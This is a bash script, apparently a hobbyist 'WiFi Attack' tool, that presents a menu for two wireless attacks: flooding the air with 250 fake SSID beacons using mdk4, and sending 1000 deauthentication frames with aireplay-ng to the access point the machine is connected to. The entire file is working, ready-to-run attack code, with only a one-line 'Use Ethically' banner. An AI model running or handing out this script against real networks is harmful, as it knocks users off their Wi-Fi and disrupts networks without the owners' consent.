#!/bin/bash

INTERFACE="wlan0"
MONITOR="wlan0mon"
TEMP_SSID_FILE="/tmp/fake_ssidlist.txt"

function cleanup() {
    echo -e "\n[*] Cleaning up..." | lolcat
    sudo airmon-ng stop $MONITOR
    sudo systemctl start NetworkManager
    echo "[*] Monitor mode disabled and NetworkManager restarted." | lolcat
    exit 0
}

# Catch CTRL+C
trap cleanup SIGINT

function banner() {
    clear
    figlet -f big "Wifi Attack" | lolcat
    printf "%*s\n\n" $(( ($(tput cols) + 10) / 2 )) "By: Khert | Contact me: captkhertcloud@gmail.com" | lolcat
    echo -e "\n[!] WiFi Deauther. Use Ethically.\n" | lolcat
}

function enable_monitor() {
    echo -e "\n[+] Enabling monitor mode..." | lolcat
    sudo airmon-ng check kill
    sudo airmon-ng start $INTERFACE
}

function generate_fake_ssidlist() {
    echo -e "\n[+] Generating 250 fake SSIDs..." | lolcat
    > $TEMP_SSID_FILE
    while true; do
        RAND=$(tr -dc 'A-Z0-9' </dev/urandom | head -c 4)
        echo "ARCHKHERT-$RAND" >> $TEMP_SSID_FILE
        COUNT=$(wc -l < $TEMP_SSID_FILE)
        if [ "$COUNT" -ge 250 ]; then
            break
        fi
    done
}

function get_connected_bssid() {
    echo -e "\n[+] Detecting connected Wi-Fi..." | lolcat
    CONN_INFO=$(iw dev $INTERFACE link)
    BSSID=$(echo "$CONN_INFO" | grep "Connected to" | awk '{print $3}')
    CHANNEL=$(iw dev $INTERFACE info | grep channel | awk '{print $2}')
    
    if [ -z "$BSSID" ]; then
        echo -e "[!] Not connected to any Wi-Fi network. Cannot perform deauth." | lolcat
        exit 1
    fi

    echo -e "[+] Connected to BSSID: $BSSID on Channel: $CHANNEL" | lolcat
}

function fake_ssid_flood() {
    enable_monitor
    generate_fake_ssidlist
    echo -e "[+] Starting fake SSID broadcast with mdk4..." | lolcat
    sudo mdk4 $MONITOR b -f $TEMP_SSID_FILE -s 100 &
    PID=$!
    wait $PID
}

function deauth_connected_wifi() {
    get_connected_bssid
    enable_monitor
    echo -e "[+] Setting monitor to channel $CHANNEL..." | lolcat
    sudo iwconfig $MONITOR channel $CHANNEL
    echo -e "[+] Starting deauth attack on $BSSID..." | lolcat
    sudo aireplay-ng --deauth 1000 -a $BSSID $MONITOR &
    PID=$!
    wait $PID
}

banner

echo -e "==== \e[1;31mWiFi Attack Menu\e[0m ====" | lolcat
echo -e "[1] Broadcast 250 Fake SSIDs" | lolcat
echo -e "[2] Deauth Connected Wi-Fi Automatically" | lolcat
echo -e "[3] Exit" | lolcat
read -p $'\nSelect option [1-3]: ' OPTION

case $OPTION in
    1)
        fake_ssid_flood
        ;;
    2)
        deauth_connected_wifi
        ;;
    3)
        cleanup
        ;;
    *)
        echo -e "[!] Invalid option." | lolcat
        ;;
esac
